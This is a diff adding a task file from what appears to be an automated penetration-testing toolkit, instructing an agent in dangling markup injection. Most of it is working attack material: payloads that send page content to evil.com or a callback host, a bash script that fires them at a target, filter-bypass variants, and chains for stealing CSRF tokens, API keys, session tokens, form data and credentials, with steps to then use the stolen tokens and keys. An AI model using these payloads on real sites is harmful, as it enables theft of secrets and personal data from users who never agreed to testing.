@@ -1,0 +1,583 @@
+================================================================================
+TASK 60 · DANGLING MARKUP INJECTION
+================================================================================
+Covers testing_toolkit.txt Phase 6 Step 21
+Last resort when XSS AND CSS injection both fail.
+
+OBJECTIVE:
+- Exploit HTML injection via unclosed tags to capture subsequent page content
+- Steal CSRF tokens, hidden inputs, API keys from page source
+- Hijack forms and links via base/form/anchor injection
+- Bypass CSP when scripts AND styles are blocked
+
+================================================================================
+INPUTS
+================================================================================
+outputs/xss_reflections_kxss.txt           ← Reflection points (HTML injection)
+outputs/queue_xss_manual_exploitation.txt  ← Failed XSS candidates
+outputs/queue_dynamic_endpoints_urls.txt   ← Parameterized URLs
+outputs/url_corpus_all_in_scope.txt        ← Full URL corpus
+outputs/waf_fingerprints.txt               ← WAF detection
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/dangling_markup/
+├── injection_points.txt           ← Confirmed dangling markup locations
+├── captured_data.json             ← Successfully captured sensitive data
+├── form_hijack_candidates.txt     ← Forms vulnerable to hijacking
+├── base_injection_success.txt     ← Successful <base> injections
+└── scan_log.txt                   ← Execution log
+
+================================================================================
+🚨 WHEN TO USE DANGLING MARKUP 🚨
+================================================================================
+Dangling markup is your LAST RESORT when:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ BLOCKED                          │ DANGLING MARKUP WORKS BECAUSE           │
+├──────────────────────────────────┼─────────────────────────────────────────┤
+│ CSP blocks script-src            │ No JavaScript needed                    │
+│ CSP blocks style-src             │ No CSS needed                           │
+│ <script> filtered                │ Uses <img>, <base>, <form>, <a>         │
+│ Event handlers (onclick) blocked │ Relies on browser parsing behavior      │
+│ CSS exfil blocked                │ Uses HTTP request via src/href/action   │
+│ All JS contexts sanitized        │ Pure HTML attribute exploitation        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+ATTACK CHAIN:
+  XSS Failed → Try CSS Injection (Task 59) → Failed → Try Dangling Markup
+
+================================================================================
+PHASE 1: UNDERSTAND DANGLING MARKUP
+================================================================================
+
+───────────────────────────────────────
+1.1 Core Concept
+───────────────────────────────────────
+Dangling markup exploits UNCLOSED HTML tags to capture subsequent page content.
+
+HOW IT WORKS:
+1. Attacker injects: <img src="https://evil.com/?data=
+2. Tag is UNCLOSED (no closing >)
+3. Browser searches for next " to close the src attribute
+4. Everything between injection and next " becomes part of the URL
+5. Captured content sent to attacker's server
+
+EXAMPLE:
+─────────
+Page source:
+  <div>Hello <img src="https://evil.com/?data= ATTACKER_INPUT</div>
+  <input type="hidden" name="csrf" value="SECRET123">
+  <p>More content"</p>
+
+Browser interprets:
+  <img src="https://evil.com/?data= ATTACKER_INPUT</div>
+  <input type="hidden" name="csrf" value="SECRET123">
+  <p>More content">
+
+Request sent to evil.com:
+  GET /?data=%20ATTACKER_INPUT%3C/div%3E%0A%20%20%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%22SECRET123
+
+CAPTURED: csrf=SECRET123 🎯
+
+───────────────────────────────────────
+1.2 Why It Works
+───────────────────────────────────────
+Browsers are FORGIVING with malformed HTML:
+- Unclosed quotes are auto-closed at next matching quote
+- Unclosed tags capture everything until browser finds closure
+- Newlines and HTML tags become part of attribute values
+
+================================================================================
+PHASE 2: DANGLING MARKUP PAYLOADS
+================================================================================
+
+───────────────────────────────────────
+2.1 Unclosed img src (MOST COMMON)
+───────────────────────────────────────
+# Basic payload - captures until next double quote
+<img src="https://CALLBACK/?leak=
+
+# Single quote variant - captures until next single quote
+<img src='https://CALLBACK/?leak=
+
+# With alt text for legitimacy
+<img src="https://CALLBACK/?d= alt="Loading...
+
+# No quotes (captures until space/newline/> - less reliable)
+<img src=https://CALLBACK/?
+
+───────────────────────────────────────
+2.2 Unclosed base href
+───────────────────────────────────────
+# Hijacks ALL relative URLs on page
+<base href="https://evil.com/
+
+# When page has: <a href="/profile">Profile</a>
+# Browser fetches: https://evil.com/profile
+# → Captures clicks + steals paths
+
+# Also hijacks:
+# - <img src="/logo.png">     → https://evil.com/logo.png
+# - <script src="/app.js">    → https://evil.com/app.js (CSP may block)
+# - <form action="/submit">   → https://evil.com/submit (form hijack!)
+
+───────────────────────────────────────
+2.3 Unclosed form action
+───────────────────────────────────────
+# Hijacks form submissions
+<form action="https://evil.com/steal?
+
+# If subsequent form exists without closing your injected one:
+# User submits → data goes to evil.com
+
+# With method=GET for easier capture
+<form action="https://CALLBACK/form?" method="GET
+
+───────────────────────────────────────
+2.4 Unclosed anchor href
+───────────────────────────────────────
+# Captures until next quote + hijacks click
+<a href="https://evil.com/?data=
+
+# User sees normal-looking link but it leads to attacker
+# Subsequent page content becomes part of URL
+
+───────────────────────────────────────
+2.5 Unclosed button formaction
+───────────────────────────────────────
+# Overrides form action for specific button
+<button formaction="https://evil.com/?
+
+───────────────────────────────────────
+2.6 Meta refresh redirect
+───────────────────────────────────────
+# Redirect with captured content
+<meta http-equiv="refresh" content="0;url=https://evil.com/?
+
+# Captures content in URL parameter during redirect
+
+───────────────────────────────────────
+2.7 Textarea/style capture
+───────────────────────────────────────
+# Textarea eats everything until </textarea>
+<textarea>
+
+# If page doesn't have </textarea>, captures entire page
+# Then form submission sends captured content
+
+# Style tag capture (if styles not blocked)
+<style>
+
+================================================================================
+PHASE 3: FIND INJECTION POINTS
+================================================================================
+
+───────────────────────────────────────
+3.1 Identify HTML Reflection
+───────────────────────────────────────
+Dangling markup requires HTML injection (not just text reflection).
+
+# Test for HTML reflection
+curl -s "https://target.com/page?name=<test123>" | grep "<test123>"
+
+# If <test123> appears as-is → HTML injection possible
+# If &lt;test123&gt; → HTML encoded, dangling markup won't work
+
+───────────────────────────────────────
+3.2 Check What's Blocked
+───────────────────────────────────────
+# Test various tags
+curl -s "https://target.com/page?x=<script>" | grep -i script
+curl -s "https://target.com/page?x=<img>" | grep -i img
+curl -s "https://target.com/page?x=<base>" | grep -i base
+curl -s "https://target.com/page?x=<form>" | grep -i form
+curl -s "https://target.com/page?x=<a>" | grep -i "<a"
+
+# Look for:
+# - Which tags pass through unfiltered
+# - Which attributes are allowed (src, href, action)
+
+───────────────────────────────────────
+3.3 Identify Sensitive Data AFTER Injection Point
+───────────────────────────────────────
+⚠️ CRITICAL: Dangling markup captures content AFTER injection point.
+
+# View page source, find injection location
+curl -s "https://target.com/page?name=MARKER" | grep -A50 "MARKER"
+
+# Look for sensitive data AFTER your marker:
+# - <input type="hidden" name="csrf" value="...">
+# - <input name="token" value="...">
+# - data-api-key="..."
+# - session cookies in JavaScript
+# - User PII (email, name)
+
+If sensitive data is BEFORE injection point → dangling markup won't help.
+
+================================================================================
+PHASE 4: EXPLOITATION WORKFLOW
+================================================================================
+
+───────────────────────────────────────
+4.1 Setup Callback Server
+───────────────────────────────────────
+# Start Interactsh
+interactsh-client -v
+# Note: xyz123.interactsh.com
+
+# Or simple Python server
+python3 -m http.server 8080
+# Use ngrok for public URL: ngrok http 8080
+
+───────────────────────────────────────
+4.2 Craft Payload Based on Context
+───────────────────────────────────────
+STEP 1: Identify what comes AFTER injection point
+STEP 2: Identify next quote type (" or ')
+STEP 3: Choose appropriate payload
+
+# If next quote is double quote:
+<img src="https://CALLBACK/?d=
+
+# If next quote is single quote:
+<img src='https://CALLBACK/?d=
+
+# If you need to capture across newlines:
+<img src="https://CALLBACK/?d=
+
+───────────────────────────────────────
+4.3 Test and Refine
+───────────────────────────────────────
+# Inject payload
+curl "https://target.com/page?name=<img src=\"https://CALLBACK/?d="
+
+# Check your callback server for incoming request
+# Analyze what was captured
+# Refine payload if needed
+
+───────────────────────────────────────
+4.4 Complete Attack Script
+───────────────────────────────────────
+#!/bin/bash
+# dangling_markup_test.sh
+
+TARGET="$1"
+PARAM="$2"
+CALLBACK="$3"
+
+echo "[*] Testing dangling markup injection"
+echo "[*] Target: $TARGET"
+echo "[*] Param: $PARAM"
+
+# Payloads to test
+declare -a PAYLOADS=(
+    '<img src="https://'"$CALLBACK"'/?d='
+    "<img src='https://$CALLBACK/?d="
+    '<base href="https://'"$CALLBACK"'/'
+    '<form action="https://'"$CALLBACK"'/form?'
+    '<a href="https://'"$CALLBACK"'/?'
+    '<meta http-equiv="refresh" content="0;url=https://'"$CALLBACK"'/?'
+)
+
+for payload in "${PAYLOADS[@]}"; do
+    echo "[*] Testing: $payload"
+    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
+    curl -s "${TARGET}?${PARAM}=${encoded}" > /dev/null
+    sleep 1
+done
+
+echo "[*] Check callback server for captured data"
+
+================================================================================
+PHASE 5: HIGH-VALUE TARGETS
+================================================================================
+
+───────────────────────────────────────
+5.1 CSRF Token Capture
+───────────────────────────────────────
+Most common dangling markup target:
+
+# Page has:
+<input type="hidden" name="csrf_token" value="abc123xyz">
+
+# Inject BEFORE this:
+<img src="https://evil.com/?
+
+# Captures:
+GET /?<input type="hidden" name="csrf_token" value="abc123xyz">...
+
+# Extract token from URL-encoded capture
+
+───────────────────────────────────────
+5.2 API Keys in Page
+───────────────────────────────────────
+# Page has embedded config:
+<script>
+  var config = {
+    apiKey: "sk-123456789"
+  };
+</script>
+
+# Inject before this to capture
+
+───────────────────────────────────────
+5.3 Form Data Pre-fill
+───────────────────────────────────────
+# Page has pre-filled form:
+<input name="email" value="victim@example.com">
+<input name="phone" value="555-1234">
+
+# Capture user PII via dangling markup
+
+───────────────────────────────────────
+5.4 Session/Auth Tokens in HTML
+───────────────────────────────────────
+# Sometimes tokens embedded in page:
+<script>
+  window.authToken = "eyJhbG...";
+</script>
+
+# Or in data attributes:
+<div data-session="abc123" data-user-id="12345">
+
+───────────────────────────────────────
+5.5 Internal URLs/Paths
+───────────────────────────────────────
+# Page has admin links:
+<a href="/admin/users">Admin Panel</a>
+<a href="/internal/api/v2">Internal API</a>
+
+# Use <base href="https://evil.com/"> to capture when clicked
+
+================================================================================
+PHASE 6: ADVANCED TECHNIQUES
+================================================================================
+
+───────────────────────────────────────
+6.1 Double Dangling
+───────────────────────────────────────
+If filter blocks certain characters, chain multiple injections:
+
+# First injection opens tag
+<img src=
+
+# Second injection completes callback
+https://evil.com/?
+
+───────────────────────────────────────
+6.2 Window.name Exfiltration
+───────────────────────────────────────
+If target allows frames:
+
+# Inject:
+<iframe name="
+
+# Page content becomes frame name
+# Attacker page can read window.name
+
+───────────────────────────────────────
+6.3 Object/Embed Tags
+───────────────────────────────────────
+# Some filters forget these
+<object data="https://CALLBACK/?
+<embed src="https://CALLBACK/?
+
+───────────────────────────────────────
+6.4 Link Prefetch
+───────────────────────────────────────
+# Prefetch sends request without user interaction
+<link rel="prefetch" href="https://CALLBACK/?
+
+───────────────────────────────────────
+6.5 Srcset for Responsive Images
+───────────────────────────────────────
+<img srcset="https://CALLBACK/?
+
+───────────────────────────────────────
+6.6 Background in Table
+───────────────────────────────────────
+# Old but sometimes works
+<table background="https://CALLBACK/?
+
+================================================================================
+PHASE 7: FILTER BYPASS TECHNIQUES
+================================================================================
+
+───────────────────────────────────────
+7.1 Case Variations
+───────────────────────────────────────
+<IMG SRC="https://CALLBACK/?
+<ImG sRc="https://CALLBACK/?
+
+───────────────────────────────────────
+7.2 Whitespace Tricks
+───────────────────────────────────────
+<img	src="https://CALLBACK/?    (tab instead of space)
+<img
+src="https://CALLBACK/?           (newline)
+<img/src="https://CALLBACK/?      (no space)
+
+───────────────────────────────────────
+7.3 Encoding
+───────────────────────────────────────
+# URL encoding
+%3Cimg%20src%3D%22https://CALLBACK/?
+
+# Double encoding
+%253Cimg%2520src%253D%2522
+
+# HTML entities
+&#60;img src="https://CALLBACK/?
+&#x3C;img src="https://CALLBACK/?
+
+───────────────────────────────────────
+7.4 Protocol-relative URLs
+───────────────────────────────────────
+<img src="//CALLBACK/?
+<img src=//CALLBACK/?
+
+───────────────────────────────────────
+7.5 Null Bytes
+───────────────────────────────────────
+<im%00g src="https://CALLBACK/?
+<img s%00rc="https://CALLBACK/?
+
+================================================================================
+PHASE 8: CHAINING WITH OTHER VULNERABILITIES
+================================================================================
+
+───────────────────────────────────────
+8.1 Dangling Markup → CSRF Attack
+───────────────────────────────────────
+1. Capture CSRF token via dangling markup
+2. Use token in forged state-changing request
+3. Bypass CSRF protection
+
+───────────────────────────────────────
+8.2 Base Tag → Credential Theft
+───────────────────────────────────────
+1. Inject <base href="https://evil.com/">
+2. User clicks login link (relative: /login)
+3. Browser goes to https://evil.com/login
+4. Attacker serves fake login page
+5. Capture credentials
+
+───────────────────────────────────────
+8.3 Form Hijack → Data Theft
+───────────────────────────────────────
+1. Inject <form action="https://evil.com/steal?">
+2. User fills out legitimate form
+3. Submit goes to attacker
+4. Capture form data (credit cards, addresses, etc.)
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+Dangling markup requires PRECISE understanding of HTML parsing.
+
+OBSERVE FIRST:
+─────────────
+1. View FULL page source
+2. Find your injection point
+3. Identify what sensitive data is AFTER injection
+4. Note the next quote character (" or ')
+5. Understand the page structure
+
+THINK ABOUT HTML PARSING:
+─────────────────────────
+Browser sees: <img src="INJECTION...</div><input value="SECRET">...</p>"
+
+It parses:
+- <img with src attribute
+- src value = "INJECTION...</div><input value="SECRET">...</p>"
+- Attribute value ends at next "
+
+So captured = everything until next double quote
+
+CHOOSE RIGHT PAYLOAD:
+─────────────────────
+┌────────────────────────────────────────────────────────────────────────────┐
+│ What's After Injection?        │ Best Payload                             │
+├────────────────────────────────┼──────────────────────────────────────────┤
+│ Hidden input with csrf token   │ <img src="https://CALLBACK/?             │
+│ Relative links to hijack       │ <base href="https://evil.com/            │
+│ Form to hijack                 │ <form action="https://CALLBACK/?         │
+│ Large content block            │ <textarea>                               │
+│ Script with sensitive data     │ <img src="... (capture JS)               │
+└────────────────────────────────────────────────────────────────────────────┘
+
+VERIFY YOUR CAPTURE:
+────────────────────
+1. Decode URL-encoded data from callback
+2. Extract the sensitive value
+3. Verify it's valid (test CSRF token, etc.)
+4. Document the full chain for report
+
+LIMITATIONS TO KNOW:
+────────────────────
+- Can only capture content AFTER injection point
+- Capture ends at matching quote/delimiter
+- Content-Security-Policy may block external requests
+- Some browsers handle malformed HTML differently
+- If target uses CSP with connect-src, img-src restrictions → blocked
+
+================================================================================
+COMMON MISTAKES TO AVOID
+================================================================================
+❌ Trying to capture content BEFORE injection point (impossible)
+❌ Using wrong quote type (double vs single)
+❌ Forgetting to URL-encode payload
+❌ Not checking if external requests are CSP-blocked
+❌ Missing that target sanitizes < but not quotes
+❌ Not starting callback server first
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ Injection points identified and documented
+✓ Sensitive data targets mapped (csrf, tokens, keys)
+✓ Correct payload crafted for context
+✓ Data successfully captured via callback
+✓ Extracted value verified as valid
+✓ Attack chain documented for report
+
+================================================================================
+NEXT STEPS
+================================================================================
+→ Use captured CSRF tokens to perform CSRF attacks
+→ Use captured API keys to access protected resources
+→ Chain with other vulnerabilities for maximum impact
+→ Phase 7 (Task 61+): Auth/Session/JWT attacks
+
+================================================================================
+QUICK REFERENCE: PAYLOAD CHEAT SHEET
+================================================================================
+# Capture until double quote
+<img src="https://CALLBACK/?d=
+
+# Capture until single quote
+<img src='https://CALLBACK/?d=
+
+# Hijack all relative URLs
+<base href="https://evil.com/
+
+# Hijack form submission
+<form action="https://CALLBACK/?
+
+# Redirect with capture
+<meta http-equiv="refresh" content="0;url=https://CALLBACK/?
+
+# Capture large content
+<textarea>
+
+# Clickjack style
+<a href="https://CALLBACK/?
+
+# Frame name exfil
+<iframe name="
+
+# Prefetch (no click needed)
+<link rel="prefetch" href="https://CALLBACK/?
+
